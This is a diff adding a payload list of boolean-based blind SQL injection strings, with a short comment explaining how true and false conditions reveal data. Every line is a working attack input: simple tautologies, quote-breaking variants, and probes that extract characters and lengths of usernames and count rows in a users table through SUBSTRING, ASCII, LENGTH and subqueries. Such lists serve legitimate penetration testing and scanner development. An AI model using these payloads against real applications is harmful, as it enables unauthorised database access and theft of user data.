@@ -1,0 +1,32 @@
+# Boolean-Based Blind SQL Injection Payloads
+# True condition → page loads normally. False → page changes.
+' AND 1=1--
+' AND 1=2--
+' AND 'a'='a'--
+' AND 'a'='b'--
+1 AND 1=1
+1 AND 1=2
+' OR 1=1--
+' OR 1=2--
+') AND 1=1--
+') AND 1=2--
+' AND 1=1 AND '1'='1
+' AND 1=1 AND '1'='2
+' AND SUBSTRING(username,1,1)='a'--
+' AND SUBSTRING(username,1,1)='b'--
+' AND LENGTH(username)>0--
+' AND LENGTH(username)>10--
+' AND ASCII(SUBSTRING(username,1,1))>64--
+' AND ASCII(SUBSTRING(username,1,1))>96--
+' AND (SELECT COUNT(*) FROM users)>0--
+' AND (SELECT COUNT(*) FROM users)>100--
+1' AND '1'='1
+1' AND '1'='2
+admin' AND '1'='1
+admin' AND '1'='2
+' AND 2>1--
+' AND 2<1--
+' AND 1 BETWEEN 0 AND 2--
+' AND 1 NOT BETWEEN 0 AND 2--
+1 AND (SELECT 1 FROM users LIMIT 1)=1--
+1 AND (SELECT 1 FROM users LIMIT 1)=2--
